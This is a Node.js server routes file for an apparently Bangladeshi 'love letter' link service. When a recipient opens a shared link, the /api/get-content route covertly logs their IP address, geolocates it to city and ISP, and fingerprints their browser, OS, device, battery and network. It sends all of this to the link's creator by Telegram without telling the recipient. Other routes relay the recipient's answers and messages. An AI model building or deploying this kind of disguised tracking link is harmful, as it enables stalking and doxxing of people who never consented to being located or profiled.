const path = require('path');
const https = require('https');
const { Markup } = require('telegraf');
const UAParser = require('ua-parser-js');
const { CATEGORY_CONFIGS } = require('./category');

function setupRoutes(app, db, saveDB, bot) {
    app.post('/api/get-content', async (req, res) => {
        try {
            const linkId = req.body.id;
            const clientInfo = req.body.clientInfo || {};
            const data = db.linkDatabase[linkId];
            if (!data) return res.json({ success: false });
            
            let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
            let ip = rawIp.split(',')[0].trim();
            if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
            
            const userAgent = req.headers['user-agent'] || "";
            const ua = new UAParser(userAgent);
            const browser = ua.getBrowser();
            const os = ua.getOS();
            const device = ua.getDevice();
            const cpu = ua.getCPU();
            const engine = ua.getEngine();
            
            const browserInfo = `${browser.name || 'Unknown'} (Ver: ${browser.version || 'N/A'})`;
            const osInfo = `${os.name || 'Unknown'} (Ver: ${os.version || 'N/A'})`;
            const deviceInfo = `Type: ${device.type || 'Desktop/Unknown'}, Vendor: ${device.vendor || 'N/A'}, Model: ${device.model || 'N/A'}`;
            const cpuInfo = cpu.architecture || 'Unknown';
            const engineInfo = `${engine.name || 'Unknown'} ${engine.version || ''}`.trim();
            const acceptLanguage = req.headers['accept-language'] || 'N/A';
            const referer = req.headers['referer'] || 'Direct/Unknown';
            
            const currentTimeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
            
            let visitorObj = {
                time: currentTimeString, 
                ip: ip, 
                country: "Unknown", 
                city: "Unknown", 
                isp: "Unknown", 
                browser: browserInfo,
                os: osInfo,
                device: deviceInfo,
                cpu: cpuInfo,
                engine: engineInfo,
                language: acceptLanguage.split(',')[0],
                referer: referer,
                timezone: clientInfo.timezone || "Unknown",
                network: clientInfo.network || "Unknown",
                battery: clientInfo.battery || "Unknown"
            };
            
            const notifyAdmin = (vData) => {
                const msg = `👀 লিংক ওপেন করা হয়েছে!\n` +
                            `🔗 লিংক আইডি: ${linkId}\n` +
                            `🌐 IP: ${vData.ip}\n` +
                            `📍 লোকেশন: ${vData.city}, ${vData.country} (ISP: ${vData.isp})\n` +
                            `💻 ব্রাউজার: ${vData.browser}\n` +
                            `📱 অপারেটিং সিস্টেম: ${vData.os}\n` +
                            `📟 ডিভাইস: ${vData.device}\n` +
                            `⚙️ ইঞ্জিন: ${vData.engine}\n` +
                            `🖲️ CPU: ${vData.cpu}\n` +
                            `🗣️ ভাষা: ${vData.language}\n` +
                            `🔗 সোর্স/রেফারার: ${vData.referer}\n` +
                            `🌍 টাইমজোন: ${vData.timezone}\n` +
                            `📶 নেটওয়ার্ক: ${vData.network}\n` +
                            `🔋 ব্যাটারি: ${vData.battery}\n` +
                            `🕒 সময়: ${vData.time}`;
                bot.telegram.sendMessage(data.userId, msg).catch(() => {});
            };

            if (ip && ip !== "127.0.0.1" && ip !== "::1") {
                https.get(`https://ip-api.com/json/${ip}`, (apiRes) => {
                    let body = "";
                    apiRes.on('data', chunk => body += chunk);
                    apiRes.on('end', () => {
                        try {
                            const ipData = JSON.parse(body);
                            if (ipData.status === "success") {
                                visitorObj.country = ipData.country || "Unknown";
                                visitorObj.city = ipData.city || "Unknown";
                                visitorObj.isp = ipData.isp || "Unknown";
                            }
                        } catch (e) {}
                        if (!data.visitors) data.visitors = [];
                        data.visitors.push(visitorObj);
                        saveDB();
                        notifyAdmin(visitorObj);
                    });
                }).on('error', () => {
                    if (!data.visitors) data.visitors = [];
                    data.visitors.push(visitorObj);
                    saveDB();
                    notifyAdmin(visitorObj);
                });
            } else {
                if (!data.visitors) data.visitors = [];
                data.visitors.push(visitorObj);
                await saveDB();
                notifyAdmin(visitorObj);
            }
            
            if (data.countdown && new Date(data.countdown) > new Date()) {
                return res.json({ success: true, isLocked: true, countdownTime: data.countdown });
            }
            
            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
            return res.json({ 
                success: true, isLocked: false, title: config.title, music: data.music, 
                animations: data.animations, letter: data.letter, emojis: config.emojis, 
                question: config.question, buttons: config.buttons, image: data.image || null 
            });
        } catch (err) { 
            res.json({ success: false }); 
        }
    });

    app.post('/api/open-envelope', async (req, res) => {
        try {
            const { id } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });

            bot.telegram.sendMessage(data.userId, `👁️‍🗨️ খাম খোলা হয়েছে!\nলিংক আইডি: ${id}`).catch(() => {});
            return res.json({ success: true });
        } catch (err) {
            res.json({ success: false });
        }
    });

    app.post('/api/submit-answer', async (req, res) => {
        try {
            const { id, answer } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });
            
            data.answer = answer;
            await saveDB();
            
            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
            bot.telegram.sendMessage(data.userId, `📨 হ্যাঁ/না নোটিফিকেশন!\nলিংক আইডি: ${id}\nQuestion: ${config.question}\nAns: ${answer}`).catch(() => {});
            
            return res.json({ success: true });
        } catch (err) { 
            res.json({ success: false }); 
        }
    });

    app.post('/api/submit-message', async (req, res) => {
        try {
            const { id, message } = req.body;
            const data = db.linkDatabase[id];
            if (!data) return res.json({ success: false });

            data.message = message;
            await saveDB();

            bot.telegram.sendMessage(data.userId, `📨 মেসেজ নোটিফিকেশন!\nলিংক আইডি: ${id}\nমেসেজ: ${message}`).catch(() => {});

            return res.json({ success: true });
        } catch (err) {
            res.json({ success: false });
        }
    });

    app.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
}

module.exports = { setupRoutes };
